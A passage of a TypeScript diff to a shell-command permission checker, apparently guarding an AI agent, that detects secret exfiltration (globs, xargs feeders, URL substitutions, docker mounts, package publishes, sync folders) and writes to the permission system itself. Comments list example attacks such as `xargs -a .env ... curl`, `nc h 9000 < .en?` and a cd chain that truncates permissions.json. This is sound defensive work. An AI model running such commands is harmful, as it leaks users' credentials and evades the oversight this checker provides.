+      const rewrite = (whole: string): string => {
+        if (whole === UNKNOWN || !links.length) return whole;
+        // A sender's `@file` and `key=@file` forms name the file after the `@`.
+        const at = /^([^=@]*=?@)(.+)$/.exec(whole);
+        if (at) {
+          const inner = rewrite(at[2]);
+          return inner === at[2] ? whole : `${at[1]}${inner}`;
+        }
+        const word = whole;
+        const path = item.cwd === undefined && !isAbsolute(word) ? undefined : this.paths.canonical(word, item.cwd ?? this.cwd);
+        for (const { link, target } of links) {
+          if (path === link || (path && path.startsWith(`${link}/`))) {
+            changed = true;
+            return target + path.slice(link.length);
+          }
+        }
+        return word;
+      };
+      const next = links.length ? { ...item, words: [item.words[0], ...item.words.slice(1).map(rewrite)], writes: item.writes.map(rewrite), reads: item.reads.map(rewrite) } : item;
+      const words = unwrapped(item.words);
+      // Links made otherwise (iteration 3): a bind mount (`bindfs SRC DST`, `mount --bind SRC DST`), and inline code's
+      // symlink calls (`os.symlink`, `fs.symlinkSync`, `File.symlink`): the path its literals lead from home or `/`, to
+      // the link it names.
+      if (item.cwd !== undefined) {
+        const program = basename(words[0] ?? "");
+        const operands = words.slice(1).filter((word) => !word.startsWith("-"));
+        if ((program === "bindfs" || (program === "mount" && words.some((word) => word === "--bind" || word === "--rbind" || /bind/.test(word)))) && operands.length >= 2 && !operands.includes(UNKNOWN)) {
+          const [source, target] = operands.slice(-2);
+          links.push({ link: this.paths.canonical(target, item.cwd), target: this.paths.canonical(source, item.cwd) });
+        }
+        const inline = codeOf(runWords(item.words), UNKNOWN, undefined);
+        if (inline && inline.source.from === "inline" && /\b(?:symlink|symlinkSync|symlink_to|make_symlink|link)\s*\(/.test(inline.source.text)) {
+          const scan = scanCode(inline.source.text, inline.interpreter.language as Parameters<typeof scanCode>[1], secretName);
+          const literals = [...inline.source.text.matchAll(/['"]([^'"\s]+)['"]/g)].map((match) => match[1]);
+          // A home path the code builds (not the home-relative reading of a bare literal), else an absolute literal.
+          const target = scan.paths.find((path) => path.startsWith("~/") && !literals.includes(path.slice(2))) ?? scan.paths.find((path) => path.startsWith("/") && literals.includes(path) && path.split("/").length > 2);
+          const link = [...literals].reverse().find((text) => !text.startsWith("~") && !text.startsWith("/") && /^[\w.@+-][\w./@+-]*$/.test(text) && !/^(os|fs|path|shutil|pathlib)$/.test(text));
+          if (target && link) links.push({ link: this.paths.canonical(link, item.cwd), target: this.paths.canonical(resolveText(target, this.home), item.cwd) });
+        }
+      }
+      if (basename(words[0] ?? "") === "ln" && words.some((word) => /^-[a-zA-Z]*s/.test(word) || word === "--symbolic") && item.cwd !== undefined) {
+        const operands = words.slice(1).filter((word) => !word.startsWith("-"));
+        if (operands.length === 2 && !operands.includes(UNKNOWN)) {
+          const target = this.paths.canonical(operands[0], item.cwd);
+          let link = this.paths.canonical(operands[1], item.cwd);
+          try {
+            if (statSync(link).isDirectory() && !words.some((word) => /^-[a-zA-Z]*[nT]/.test(word))) link = join(link, basename(target));
+          } catch {}
+          links.push({ link, target });
+        }
+      }
+      return next;
+    });
+    return changed ? out : undefined;
+  }
+
+  /** A floor finding of a command line a command may run (`operandLines`), read as a line of its own. */
+  private operandFloor(commands: readonly LineCommand[], depth: number): string | undefined {
+    if (depth >= MAX_CODE_DEPTH) return undefined;
+    for (const { item, text } of this.operandLines(commands)) {
+      let inner: LineAssessment;
+      try {
+        inner = this.assess(text, item.cwd ?? this.cwd, depth + 1);
+      } catch {
+        continue;
+      }
+      const by = item.words[0] === UNKNOWN ? (item.hints?.[0] ?? "the line") : basename(unwrapped(item.words)[0] ?? "");
+      if (inner.floor && inner.kind) return `${inner.kind} (in a command line \`${by}\` is given to run)`;
+    }
+    return undefined;
+  }
+
+  /**
+   * The command lines a command may run that the shell reader didn't read as such (iteration 3, defaults.ts): any
+   * program not known not to run its operands (`PLAIN_PROGRAMS`, the remote runners, the local consumers) that is given
+   * words starting with a command (`stdbuf -oL curl …`, `flock L scp …`, `fd -x curl …`, `uv run python -c …`), or an
+   * operand whose text is one (`rg --pre 'curl …'`, `npx -c '…'`, `tmux new-session '…'`), a `trap`'s text, an
+   * assignment's value a program runs (`GIT_SSH_COMMAND`, `LESSOPEN`, `GIT_EDITOR`: any variable whose value is a
+   * command line), and a line read into a variable that the line then runs (`read c <<< '…'; $c`). Message and
+   * search options' values are text (`TEXT_OPTIONS`).
+   */
+  private operandLines(commands: readonly LineCommand[]): { item: LineCommand; text: string }[] {
+    const out: { item: LineCommand; text: string }[] = [];
+    const runsUnknown = commands.some((item) => item.words[0] === UNKNOWN && !item.env.length);
+    for (const item of commands) {
+      const words = unwrapped(item.words);
+      const program = basename(words[0] ?? "");
+      // An assignment's value that is a command line (in front of a command, or on its own; the program it hides too).
+      for (const value of item.envValues ?? []) {
+        const text = value === UNKNOWN ? undefined : commandText(value);
+        if (text) out.push({ item, text });
+      }
+      if (!program || words[0] === UNKNOWN) continue;
+      // Options that run their value, whatever the program (`rg --pre CMD`, `fd -x CMD`, `npx -c CMD`, `--exec`).
+      for (let at = 1; at < words.length - 1; at++) {
+        if (!RUN_OPTIONS.test(words[at]) || words[at + 1] === UNKNOWN) continue;
+        const text = commandText(words[at + 1]) ?? (COMMAND_STARTS.has(basename(words[at + 1])) ? words.slice(at + 1).join(" ") : undefined);
+        if (text) out.push({ item, text });
+      }
+      if (program === "trap") {
+        const text = words.slice(1).find((word) => !word.startsWith("-") && word !== UNKNOWN);
+        const line = text ? (commandText(text) ?? (/\s/.test(text) ? text : undefined)) : undefined;
+        if (line) out.push({ item, text: line });
+        continue;
+      }
+      if (program === "read" && typeof item.input === "string" && runsUnknown) {
+        const line = commandText(item.input);
+        if (line) out.push({ item, text: line });
+        continue;
+      }
+      if (item.inert || item.script === true || PLAIN_PROGRAMS.has(program) || REMOTE_RUNNERS.has(program) || LOCAL_CONSUMERS.has(program) || codeOf(words, UNKNOWN, undefined)) continue;
+      // A package runner runs the package it names with the words after it (`npx np`, `pnpm dlx X`, `bunx X`, `uvx X`,
+      // `pipx run X`, `uv run X`): that package is a program, whatever its name.
+      const runner = PACKAGE_RUNNERS.find((row) => row.program === program && row.sub.every((word, at) => words[at + 1] === word));
+      if (runner) {
+        const rest = words.slice(1 + runner.sub.length);
+        let at = 0;
+        while (at < rest.length && rest[at].startsWith("-")) at += /^(--with|-p|--package|--python|--from|--spec)$/.test(rest[at]) ? 2 : 1;
+        if (rest[at] !== undefined && rest[at] !== UNKNOWN && !rest.slice(at).includes(UNKNOWN)) out.push({ item, text: rest.slice(at).map((part) => (/^[\w@%+=:,./{}-]+$/.test(part) ? part : `'${part.replaceAll("'", `'\\''`)}'`)).join(" ") });
+      }
+      for (let at = 1; at < words.length; at++) {
+        const word = words[at];
+        if (word === UNKNOWN) continue;
+        if (TEXT_OPTIONS.test(words[at - 1] ?? "")) continue;
+        const name = basename(word);
+        if (COMMAND_STARTS.has(name) && !word.includes(" ")) {
+          out.push({ item, text: words.slice(at).map((part) => (/^[\w@%+=:,./{}-]+$/.test(part) ? part : `'${part.replaceAll("'", `'\\''`)}'`)).join(" ") });
+          break;
+        }
+        const text = /\s/.test(word) ? commandText(word) : undefined;
+        if (text) out.push({ item, text });
+      }
+    }
+    return out.slice(0, 8);
+  }
+
+  /**
+   * Row 1 by default (iteration 3, defaults.ts): a secret's contents handed to a program not known to keep them on this
+   * machine (`LOCAL_CONSUMERS`) — on its input (`< F`, a pipe from a command that read one) or in an argument a
+   * substitution built from one — may leave it; and a secret file given to a program that names another machine (a
+   * host option, a URL, `//host/`, `host:path`), or to a listed sink, is sent. A secret is one by name (the sensitive
+   * patterns) or by what the file holds (`secretByContent`). Not when it reaches the tool's own credential option
+   * (`OWN_CREDENTIAL`: `--password-stdin`, `-i KEY`, `--kubeconfig`): a tool using its credential is the judge's.
+   */
+  private defaultSink(commands: readonly LineCommand[]): string | undefined {
+    const facts = this.riskFacts();
+    const secretAt = (word: string, cwd: string | undefined): string | undefined => {
+      if (word === UNKNOWN || word.startsWith("-") || /^[a-z][\w+.-]*:\/\//i.test(word) || (cwd === undefined && !isAbsolute(word) && !word.startsWith("~"))) return undefined;
+      const name = word.replace(/^[^=@]*=?@/, "").replace(/^@/, "");
+      if (!name || name.length > 512) return undefined;
+      // A glob (iteration 4: `@.[e]nv`, `@.e*`): the files it matches now, a secret among them.
+      if (/[*?[]/.test(name)) {
+        const found = this.couldBe(name, cwd);
+        const secret = found.matches.find((match) => match.zone === "sensitive" || secretByContent(match.path, secretName));
+        return secret ? displayPath(secret.path, this.home) : undefined;
+      }
+      const classification = this.classify(name, cwd);
+      let file = false;
+      try {
+        file = statSync(classification.path).isFile();
+      } catch {}
+      // A secret by name counts where the line names it from home or by its absolute path, whether it is there now or not
+      // (as the data-flow floor reads them); by content, only a file that is there.
+      if (classification.zone === "sensitive" && (file || isAbsolute(name) || name.startsWith("~"))) return name;
+      if (!file) return undefined;
+      if (secretByContent(classification.path, secretName)) return name;
+      return undefined;
+    };
+    const contentSecret = (word: string, cwd: string | undefined): string | undefined => {
+      const found = secretAt(word, cwd);
+      if (!found) return undefined;
+      return this.classify(found, cwd).zone === "sensitive" ? undefined : found;
+    };
+    /** The words of the command a secret would reach (for a credential's issuer test). */
+    let issuedFor: readonly string[] | undefined;
+    const readsSecret = (item: LineCommand): string | undefined => {
+      for (const path of item.reads) {
+        const found = secretAt(path, item.cwd);
+        if (found) return found;
+      }
+      const view = viewOf(unwrapped(item.words));
+      // A stored credential printed (`gh auth token`, a key export) is a secret proper; the environment printers
+      // (`ps eww`, `env`) are often an identity check on this machine: left to the data-flow floor's own reading.
+      const source = credentialSource(view);
+      if (source && source !== "the environment") return issuerOf(view) && issuedFor ? (onlyReaches(issuedFor, issuerOf(view)!) ? undefined : source) : source;
+      if (!CONTENT_PRINTERS.has(view.program)) return undefined;
+      for (const word of view.args) {
+        const found = secretAt(word, item.cwd);
+        if (found) return found;
+      }
+      return undefined;
+    };
+    const ownCredential = (words: readonly string[]) => words.some((word) => OWN_CREDENTIAL.test(word));
+    for (const [index, item] of commands.entries()) {
+      const words = unwrapped(item.words);
+      const program = basename(words[0] ?? "");
+      if (!program || words[0] === UNKNOWN || item.inert) continue;
+      const view = viewOf(words);
+      const interpreter = codeOf(words, UNKNOWN, undefined);
+      const local = LOCAL_CONSUMERS.has(program) || interpreter !== undefined || FEEDER_NAMES.has(program);
+      // A container given a folder of this machine and told to use a secret in it (iteration 4: `docker run -v
+      // ~/.ssh:/k IMAGE -F f=@/k/id_ed25519 …`): what it names under the mount is that file here, and a container's
+      // program is told to reach another machine. (Its own folders are the container's; a mount it isn't told to use, or a
+      // line naming no other machine, no row 1.)
+      if (/^(docker|podman|nerdctl)$/.test(program) && words.some((word) => word === "run" || word === "create") && namedRemote(words, UNKNOWN) !== undefined) {
+        const mounts: { from: string; to: string }[] = [];
+        for (const [at, word] of words.entries()) {
+          const value = word === "-v" || word === "--volume" || word === "--mount" ? words[at + 1] : /^(-v|--volume=|--mount=)(.+)$/.exec(word)?.[2];
+          if (!value || value === UNKNOWN) continue;
+          const bind = /^type=bind,(?:.*,)?(?:source|src)=([^,]+),(?:.*,)?(?:target|dst|destination)=([^,]+)/.exec(value) ?? /^([^:]+):([^:]+)(?::[a-z,]+)?$/.exec(value);
+          if (bind && (bind[1].startsWith("/") || bind[1].startsWith("~") || bind[1].startsWith("."))) mounts.push({ from: bind[1], to: bind[2].replace(/\/+$/, "") });
+        }
+        for (const [at, word] of words.entries()) {
+          // A tool's own credential option (`--kubeconfig /kube/config`) uses it, as on this machine.
+          if (OWN_CREDENTIAL.test(words[at - 1] ?? "") || OWN_CREDENTIAL.test(word) || usesKey(basename(words[at - 2] ?? ""), words[at - 1] ?? "")) continue;
+          for (const part of [word, ...word.split(/[\s,=]+/)]) {
+            const name = part.replace(/^[^=@]*=?@/, "").replace(/^@/, "");
+            const mount = mounts.find((m) => name === m.to || name.startsWith(`${m.to}/`));
+            if (!mount) continue;
+            const here = `${mount.from.replace(/\/+$/, "")}${name.slice(mount.to.length)}`;
+            const found = secretAt(here, item.cwd);
+            if (found) return `sends a secret off this machine (${found}, mounted into the container that is told to use it)`;
+          }
+        }
+      }
+      // A secret file named to a sink or to a program that talks to another machine.
+      const remote = namedRemote(words, UNKNOWN);
+      // A program that runs its words on another machine (ssh, docker exec, kubectl exec): its paths are that machine's.
+      if ((remote || sinkOf(view)) && !runsElsewhere(words)) {
+        // A word known only when it runs whose place the reader computed exactly (no glob: `@"$(git rev-parse
+        // --show-toplevel)/.env"`) is that path (iteration 3): the could-be is a is.
+        const offset = item.words.length - words.length;
+        const exact = (at: number): string | undefined => {
+          const pattern = item.patterns?.[at + offset];
+          return pattern !== undefined && !/[*?[\u0001]/.test(pattern.replace(/\\./g, "")) ? pattern.replace(/\\(.)/g, "$1") : undefined;
+        };
+        for (const [at, raw] of words.entries()) {
+          // A glob it is given (iteration 4: `@.[e]nv`): the files it matches, by its pattern.
+          const globbed = (): string | undefined => {
+            const pattern = item.patterns?.[at + offset];
+            return pattern !== undefined && !pattern.includes("\u0001") && /[*?[]/.test(pattern) ? pattern : undefined;
+          };
+          const glob = raw === UNKNOWN ? globbed() : /[*?[]/.test(raw) ? raw : undefined;
+          const word = raw === UNKNOWN ? (exact(at) ?? glob ?? raw) : raw;
+          // A tool's own key or credential option (per program: risk.ts `KEY_OPTIONS`; by name: `OWN_CREDENTIAL`).
+          if (at === 0 || OWN_CREDENTIAL.test(words[at - 1] ?? "") || OWN_CREDENTIAL.test(word) || usesKey(program, words[at - 1] ?? "") || usesKey(program, word)) continue;
+          // What it writes is no part of what it sends (`curl URL -o ca.pem`).
+          if (OUTPUT_OPTIONS.test(words[at - 1] ?? "") || /^-[a-zA-Z]*o$/.test(words[at - 1] ?? "") || /^(-o|--output)=?/.test(word) && OUTPUT_OPTIONS.test(word)) continue;
+          // A listed sink's named secrets are the data-flow floor's (`exfiltrates`); here, what only the content tells.
+          // (Only when the data-flow floor reads the command as that sink itself: through a wrapper it doesn't follow,
+          // `stdbuf -oL curl …`, the name is checked here: one reading.)
+          const listedOnly = !remote || Boolean(sinkOf(viewOf(item.words)));
+          // A download's destination (the last operand after a remote one: `aws s3 cp s3://b/k.pem /tmp/k.pem`) is written.
+          const positionals = words.slice(1).filter((w) => !w.startsWith("-"));
+          // (Only for programs that copy from a source to a destination: a database client's last word is its input.)
+          if (COPIERS.has(program) && raw === positionals.at(-1) && positionals.length >= 2 && positionals.slice(0, -1).some((w) => /^[a-z][\w+.-]*:\/\/|^[\w.-]+@?[\w.-]*:[^/]/i.test(w))) continue;
+          // An operand's text may name it too (`-c 'put .env env.txt'`, `-a 'src=.env dest=…'`).
+          // Its text split into words, quotes and SQL punctuation off (`\\copy t from '.env'`, `INFILE '.env'`).
+          const parts = word.split(/[\s,=();]+/).map((part) => part.replace(/^['"`]+|['"`;]+$/g, ""));
+          for (const [p, part] of [word, ...parts].entries()) {
+            // Inside an operand's text, a key option of any program before it (`core.sshCommand=ssh -i KEY`) keeps it the tool's.
+            const before = p > 0 ? (parts[p - 2] ?? "") : "";
+            if (p > 0 && (OWN_CREDENTIAL.test(before) || usesKey("ssh", before) || usesKey(program, before))) continue;
+            // A glob's matches are no name the data-flow floor reads: checked here by name and content.
+            const found = listedOnly && !glob ? contentSecret(part, item.cwd) : secretAt(part, item.cwd);
+            if (found) return `sends a secret off this machine (${found}) through ${program}${remote ? `, which talks to ${remote}` : ""}`;
+          }
+        }
+      }
+      // A secret copied or written into a place that leaves the machine by itself (iteration 4: iCloud Drive, a sync
+      // client's folder, a mounted volume): a send by place, whichever program writes it.
+      {
+        const positionals = words.slice(1).filter((word) => !word.startsWith("-") && word !== UNKNOWN);
+        const destinations = [...item.writes.filter((path) => path !== UNKNOWN), ...(/^(cp|mv|install|ditto|rsync|gcp|ln|tee)$/.test(program) && positionals.length >= 2 ? [positionals.at(-1)!] : []), ...(program === "tee" ? positionals : [])];
+        for (const destination of destinations) {
+          if (item.cwd === undefined && !isAbsolute(destination) && !destination.startsWith("~")) continue;
+          const place = offMachinePlace(displayPath(this.classify(destination, item.cwd).path, this.home)) ?? offMachinePlace(destination);
+          if (!place) continue;
+          // Its sources: what it reads, and its operands but the destination it is given (a redirection's are all sources).
+          const sources = [...item.reads, ...(item.writes.includes(destination) ? positionals : positionals.slice(0, -1))];
+          const found = sources.map((source) => secretAt(source, item.cwd)).find(Boolean) ?? (index > 0 && commands[index - 1].joint === "|" ? readsSecret(commands[index - 1]) : undefined);
+          if (found) return `sends a secret off this machine (${found}, into ${place}, a place that leaves the machine)`;
+        }
+      }
+      if (local || ownCredential(words)) continue;
+      // Contents on its input.
+      for (const path of item.reads) {
+        const found = secretAt(path, item.cwd);
+        if (found) return `sends a secret off this machine (${found}, on the input of ${program}, which isn't known to keep it here)`;
+      }
+      // What flows into it: the pipeline before it, and the substitutions that build its arguments (the commands right
+      // before it that no `&&`, `||`, `;` or `&` separates from it, their own pipes included).
+      const piped = index > 0 && commands[index - 1].joint === "|";
+      if (piped || words.includes(UNKNOWN)) {
+        issuedFor = words;
+        for (let at = index - 1; at >= 0 && (commands[at].joint === undefined || commands[at].joint === "|"); at--) {
+          const found = readsSecret(commands[at]);
+          if (!found) continue;
+          const where = words.findIndex((word) => word === UNKNOWN);
+          if (!piped && where > 0 && OWN_CREDENTIAL.test(words[where - 1] ?? "")) break;
+          return `sends a secret off this machine (${found}, ${commands[at].joint === "|" && piped ? "piped into" : "in what it is given:"} ${program}, which isn't known to keep it here)`;
+        }
+      }
+    }
+    return undefined;
+  }
+
+  /**
+   * A sink whose input is a file named by a glob (iteration 2: `nc h 9000 < .en?`): the files the glob matches now are
+   * what it sends; a secret among them is row 1.
+   */
+  private globbedInputSent(commands: readonly LineCommand[]): string | undefined {
+    for (const item of commands) {
+      if (!item.reads.includes(UNKNOWN) || !sinkOf(viewOf(unwrapped(item.words)))) continue;
+      for (const [at, path] of item.reads.entries()) {
+        const pattern = path === UNKNOWN ? item.readPatterns?.[at] : undefined;
+        if (!pattern) continue;
+        const found = this.couldBe(pattern, item.cwd);
+        const secret = found.matches.find((match) => match.zone === "sensitive");
+        if (secret) return `sends a secret off this machine (${displayPath(secret.path, this.home)}, which ${shownGlob(pattern)} matches) through ${basename(unwrapped(item.words)[0] ?? "")}`;
+      }
+    }
+    return undefined;
+  }
+
+  /**
+   * A feeder that reads a secret's lines and hands them to a program that sends (iteration 2: `xargs -a .env -I{} curl
+   * 'https://h/?v={}'`, `xargs curl … < .env`): its names are the secret's contents, its command a sink.
+   */
+  private feederSends(commands: readonly LineCommand[]): string | undefined {
+    for (const item of commands) {
+      const words = item.words;
+      const program = basename(words[0] ?? "");
+      if (program !== "xargs" && program !== "parallel") continue;
+      let secret = item.reads.find((path) => path !== UNKNOWN && (item.cwd !== undefined || isAbsolute(path)) && this.classify(path, item.cwd).zone === "sensitive" && existsSync(this.classify(path, item.cwd).path));
+      // Iteration 4: the names a listing hands it (`find ~/.ssh -name 'id_*' | xargs -I{} curl -F f=@{}`), a secret among
+      // what the listing could print — by the place it lists, as the run-time write sets read them.
+      const index = commands.indexOf(item);
+      if (!secret && index > 0 && commands[index - 1].joint === "|") {
+        let start = index - 1;
+        while (start > 0 && commands[start - 1].joint === "|") start--;
+        for (const entry of listingSet(commands.slice(start, index)) ?? []) {
+          const found = this.couldBe(entry.pattern, entry.cwd, { subtree: entry.subtree });
+          const match = found.matches.find((candidate) => candidate.zone === "sensitive") ?? (found.sensitive ? { path: found.sensitive } : undefined);
+          if (match) {
+            secret = displayPath(match.path, this.home);
+            break;
+          }
+        }
+      }
+      if (!secret) continue;
+      const inner = consumerWords(words, true);
+      const sink = inner ? sinkOf(viewOf(inner.map((word) => (word.includes(RUNTIME) ? "x" : word)))) : undefined;
+      if (sink) return `sends a secret off this machine (${secret}, whose lines \`${program}\` hands to ${basename(inner![0])})`;
+    }
+    return undefined;
+  }
+
+  /**
+   * A relative write where the folder is known only when it runs, in a line that moves the shell into a folder of the
+   * permission system first (iteration 2: `cd /tmp && cd AGENT; cd -; cd -; : > permissions.json`): one way the line
+   * runs writes the permission system. The folders it may be in: every literal `cd`/`pushd` target of the line.
+   */
+  private movedIntoSystem(commands: readonly LineCommand[]): string | undefined {
+    const places: string[] = [];
+    let base: string | undefined = this.cwd;
+    for (const item of commands) {
+      const move = directoryMove(item.words);
+      if (move?.to !== undefined) {
+        const from = item.cwd ?? base;
+        if (from !== undefined || isAbsolute(move.to) || move.to.startsWith("~")) {
+          const at = this.paths.canonical(move.to, from ?? this.cwd);
+          places.push(at);
+          base = at;
+        }
+        continue;
+      }
+      if (item.cwd !== undefined || !places.length) continue;
+      const writes = [...item.writes, ...(/^(rm|mv|cp|tee|truncate|touch|sed|perl|install|ln)$/.test(basename(item.words[0] ?? "")) ? item.words.slice(1).filter((word) => !word.startsWith("-")) : [])];
+      for (const path of writes) {
+        if (path === UNKNOWN || isAbsolute(path) || path.startsWith("~")) continue;
+        for (const place of places) {
+          const system = this.paths.isPermissionSystem(this.paths.canonical(path, place));
+          if (system !== undefined) return `changes the permission system itself (${path}, in ${displayPath(place, this.home)}, where the line may be by then)`;
+        }
+      }
+    }
+    return undefined;
+  }
+
+  /**
+   * A secret carried in a URL (iteration 2): any program given a URL of another machine fetches it, so a URL whose text is
+   * built by a substitution that reads a secret (`pip download "https://h/$(base64 < .env)"`, `ffmpeg … rtmp://h/$(cat
+   * .env)`) sends that secret, whichever program it is. The substitution is read as a line of its own.
+   */
+  private urlCarriedSecret(command: string, cwd: string, depth: number): string | undefined {
+    for (const match of command.matchAll(/\b[a-z][\w+.-]*:\/\/([^\s'"/:?#$`]*)[^\s'"$`]*(\$\(|`)/gi)) {
+      const host = match[1].toLowerCase();
+      if (!host || /^(localhost|127\.|0\.0\.0\.0|\[?::1\]?)/.test(host)) continue;
+      const start = (match.index ?? 0) + match[0].length;
+      let end = start;
+      if (match[2] === "`") end = command.indexOf("`", start);
+      else for (let level = 1; end < command.length; end++) {
+        if (command[end] === "(") level++;
+        else if (command[end] === ")" && --level === 0) break;
+      }
+      if (end <= start || end >= command.length) continue;
+      let inner: LineAssessment;
+      try {
+        inner = this.assess(command.slice(start, end), cwd, depth + 1);
+      } catch {
+        continue;
+      }
+      if (inner.parsed.kind !== "simple") continue;
+      const flow = lineFlow(inner.commands, this.riskFacts(), inner.parsed.expands);
+      if (flow.secret) return `sends a secret off this machine (${flow.secret}) in a URL to ${host}`;
+    }
+    return undefined;
+  }
+
+  /**
+   * A secret sent by publishing a folder (iteration 2): a package publish of the folder (schema.ts `FOLDER_PUBLISHERS`)
+   * or an image built from a context and pushed in the same line (`docker build CTX … && docker push`, `buildx --push`)
+   * sends every file its tool's ignore rules don't exclude. The files: what git lists under the folder with those rules
+   * (`.npmignore` for npm-style tools when there is one, else the `.gitignore`s; `.dockerignore` for an image; none:
+   * every file). A secret among them is row 1. Publishing a folder without one is the judge's (`publishes a package`).
+   */
+  private publishedSecret(commands: readonly LineCommand[]): string | undefined {
+    const pushes = commands.some((item) => {
+      const words = unwrapped(item.words);
+      return /^(docker|podman)$/.test(basename(words[0] ?? "")) && (words.includes("push") || words.includes("--push"));
+    });
+    for (const item of commands) {
+      if (item.cwd === undefined) continue;
+      const words = unwrapped(item.words);
+      const at = this.paths.canonical(item.cwd, this.cwd);
+      let dir: string | undefined;
+      let ignore: string | undefined;
+      let tool = "";
+      if (folderPackage(words, at, readText) !== undefined) {
+        dir = at;
+        tool = basename(words[0]);
+        ignore = /^(npm|pnpm|yarn|bun)$/.test(tool) && existsSync(join(at, ".npmignore")) ? join(at, ".npmignore") : "standard";
+      } else if (pushes && /^(docker|podman)$/.test(basename(words[0] ?? ""))) {
+        const positionals = words.slice(1).filter((word, i, all) => !word.startsWith("-") && !/^(-t|--tag|-f|--file|--build-arg|--target|--platform|--label|--secret|--ssh|--cache-from|--cache-to|-o|--output)$/.test(all[i - 1] ?? ""));
+        const build = positionals[0] === "build" ? 1 : positionals[0] === "buildx" && positionals[1] === "build" ? 2 : 0;
+        if (!build) continue;
+        const context = positionals[build] ?? ".";
+        if (context === UNKNOWN || /^[a-z]+:\/\//i.test(context) || context === "-") continue;
+        dir = this.classify(context, at).path;
+        tool = "the image it builds";
+        ignore = existsSync(join(dir, ".dockerignore")) ? join(dir, ".dockerignore") : undefined;
+      }
+      if (!dir) continue;
+      const listed = spawnSync("git", ["-C", dir, "ls-files", "-c", "-o", ...(ignore === "standard" ? ["--exclude-standard"] : ignore ? [`--exclude-from=${ignore}`] : []), "-z"], { encoding: "utf8", stdio: ["ignore", "pipe", "ignore"], timeout: 3000 });
+      const names = listed.status === 0 ? listed.stdout.split("\0").filter(Boolean).slice(0, 5000).map((name) => join(dir!, name)) : undefined;
+      // Not a git checkout: every file under it, unless an ignore file is there (then the judge's: its rules aren't read here).
+      const secret = names ? names.find((path) => this.classify(path, dir).zone === "sensitive") : ignore === undefined || (ignore === "standard" && !existsSync(join(dir, ".gitignore"))) ? this.secretInside(dir) : undefined;
+      if (secret) return `sends a secret off this machine (${displayPath(secret, this.home)}, which ${tool === "the image it builds" ? "the image it builds and pushes holds" : `\`${tool} publish\` includes: no ignore rule excludes it`}) through ${tool === "the image it builds" ? basename(words[0] ?? "docker") + " push" : `${tool} publish`}`;
+    }
+    return undefined;
   }
 
   /**
@@ -1866,13 +2552,125 @@ export class Permissions {
     /** What earlier commands of the line wrote, with its text (undefined: known only when it runs). */
     const written = new Map<string, string | undefined>();
     for (const [index, item] of commands.entries()) {
-      const found = this.codeFinding(item, commands[index - 1], written, depth);
+      const found = this.codeFinding(item, commands[index - 1], written, depth) ?? this.scriptFinding(item, written, depth) ?? this.laterFinding(item, commands[index - 1], written, depth, commands);
       if (found) out.set(item, found);
-      const text = item.input ?? (/^(echo|printf)$/.test(item.words[0] ?? "") && !item.words.includes(UNKNOWN) ? (literalOutput(item.words) ?? `${item.words.slice(1).join(" ")}\n`) : undefined);
-      for (const path of item.writes) if (path !== UNKNOWN && (item.cwd !== undefined || isAbsolute(path))) written.set(this.classify(path, item.cwd).path, text);
-      if (item.words[0] === "tee") for (const path of item.words.slice(1)) if (path !== UNKNOWN && !path.startsWith("-") && (item.cwd !== undefined || isAbsolute(path))) written.set(this.classify(path, item.cwd).path, item.input);
+      this.noteLineWrite(item, written);
     }
     return out;
+  }
+
+  /** What one command of a line writes, with its text when the line says it (`echo`/`printf`, a heredoc, `tee`), into `written`. */
+  private noteLineWrite(item: LineCommand, written: Map<string, string | undefined>): void {
+    const text = item.input ?? (/^(echo|printf)$/.test(item.words[0] ?? "") && !item.words.includes(UNKNOWN) ? (literalOutput(item.words) ?? `${item.words.slice(1).join(" ")}\n`) : undefined);
+    for (const path of item.writes) if (path !== UNKNOWN && (item.cwd !== undefined || isAbsolute(path))) written.set(this.classify(path, item.cwd).path, text);
+    if (item.words[0] === "tee") for (const path of item.words.slice(1)) if (path !== UNKNOWN && !path.startsWith("-") && (item.cwd !== undefined || isAbsolute(path))) written.set(this.classify(path, item.cwd).path, item.input);
+  }
+
+  /**
+   * Code a command sets up and runs later, when this line gives its text (final pass, scripts.ts): the git hooks a
+   * git command triggers that this line (or this task) wrote, a crontab fed literal entries (`echo … | crontab -`,
+   * `crontab FILE` this line wrote). Read as the shell lines they are, like a project script.
+   */
+  private laterFinding(item: LineCommand, before: LineCommand | undefined, written: ReadonlyMap<string, string | undefined>, depth: number, commands: readonly LineCommand[] = []): CodeFinding | undefined {
+    if (depth > MAX_CODE_DEPTH) return undefined;
+    const words = unwrapped(item.words);
+    const at = item.cwd === undefined ? undefined : this.paths.canonical(item.cwd, this.cwd);
+    const lines: string[] = [];
+    let by = "";
+    const hooks = triggeredHooks(words);
+    if (hooks.length && at !== undefined) {
+      const top = gitRoots(at).top ?? at;
+      for (const hook of hooks) {
+        const path = this.classify(join(top, ".git", "hooks", hook), at).path;
+        const text = written.has(path) ? written.get(path) : this.taskWrote(path) ? readScript(path).text : undefined;
+        if (text) {
+          lines.push(...shellLines(text));
+          by = `the git hook ${hook} \`${words.slice(0, 2).join(" ")}\` runs`;
+        }
+      }
+    }
+    // What a pipe hands it: a literal printer, or a group of them (`(crontab -l; echo '…') | crontab -`: each literal line).
+    const piped = (): string | undefined => {
+      if (item.input !== undefined) return item.input;
+      if (before?.joint !== "|") return undefined;
+      const own = this.pipedCode(before, written);
+      if (own !== undefined || before.subshell === undefined) return own;
+      const at = commands.indexOf(before);
+      const group = commands.slice(0, at + 1).filter((other) => other.subshell === before.subshell);
+      const texts = group.map((other) => literalOutput(other.words)).filter((text): text is string => text !== undefined);
+      return texts.length ? texts.join("\n") : undefined;
+    };
+    const program = basename(words[0] ?? "");
+    // `at TIME`, `batch`: the commands on its input (or `-f FILE` this line wrote) run later.
+    if ((program === "at" || program === "batch") && !words.some((word) => /^-[lrdc]$/.test(word))) {
+      const fileAt = words.indexOf("-f");
+      const text = fileAt > 0 ? written.get(this.classify(words[fileAt + 1] ?? "", at).path) : piped();
+      if (text) {
+        lines.push(...shellLines(text));
+        by = `the commands \`${program}\` runs later`;
+      }
+    }
+    // `launchctl load|bootstrap … PLIST`: the program its plist runs (ProgramArguments, Program).
+    if (program === "launchctl" && /^(load|bootstrap|enable|kickstart)$/.test(words[1] ?? "")) {
+      for (const word of words.slice(2).filter((w) => w.endsWith(".plist") && w !== UNKNOWN)) {
+        const path = this.classify(word, at).path;
+        const text = written.has(path) ? written.get(path) : readText(path);
+        const runs = text ? plistCommand(text) : undefined;
+        if (runs) {
+          lines.push(runs);
+          by = `the launch agent ${displayPath(path, this.home)}`;
+        }
+      }
+    }
+    if (program === "crontab" && !words.includes("-l") && !words.includes("-r")) {
